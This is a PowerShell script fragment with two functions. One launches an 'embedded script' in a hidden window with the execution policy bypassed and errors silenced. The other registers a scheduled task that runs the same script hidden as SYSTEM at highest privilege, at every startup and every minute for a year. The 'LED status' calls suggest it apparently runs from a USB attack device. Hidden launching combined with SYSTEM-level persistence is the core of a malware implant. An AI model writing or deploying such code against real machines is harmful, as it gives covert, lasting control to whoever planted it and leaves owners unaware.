function Run-Script-AsAdmin {
    try {
        Write-Log "Running embedded script as administrator (hidden)..."
        Update-LED-Status "launching"
        
        for ($i = 0; $i -lt 4; $i++) {
            Update-LED-Status "launching"
            Start-Sleep -Milliseconds 500
        }
        
        Start-Process -FilePath "powershell.exe" `
            -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$LocalScriptPath`"" `
            -WindowStyle Hidden `
            -NoNewWindow `
            -ErrorAction SilentlyContinue
        
        $script:LastRunTime = Get-Date
        Update-LED-Status "running"
        Write-Log "Script launched in hidden background process"
    } catch {
        Update-LED-Status "error"
        Write-Log "Error running script: $_"
    }
}

function Setup-Scheduled-Task {
    try {
        Write-Log "Setting up scheduled task service..."
        Update-LED-Status "loaded"
        
        try {
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue -Force
            Start-Sleep -Milliseconds 500
        }
        catch { }
        
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$LocalScriptPath`"" -ErrorAction SilentlyContinue
        $triggerAtBoot = New-ScheduledTaskTrigger -AtStartup -ErrorAction SilentlyContinue
        $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 8760) -ErrorAction SilentlyContinue
        
        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -RunOnlyIfNetworkAvailable:$false `
            -MultipleInstances IgnoreNew `
            -ErrorAction SilentlyContinue
        
        Register-ScheduledTask `
            -TaskName $TaskName `
            -Principal $principal `
            -Action $action `
            -Trigger @($triggerAtBoot, $triggerRepeat) `
            -Settings $settings `
            -Force `
            -ErrorAction Stop | Out-Null
        
        Start-Sleep -Milliseconds 500
        
        Write-Log "✓ Scheduled task created successfully" "SUCCESS"
        Write-Log "Task runs at startup and every 1 minute" "SUCCESS"
    }
    catch {
        Update-LED-Status "error"
        Write-Log "Error setting up task: $_" "ERROR"
    }
}

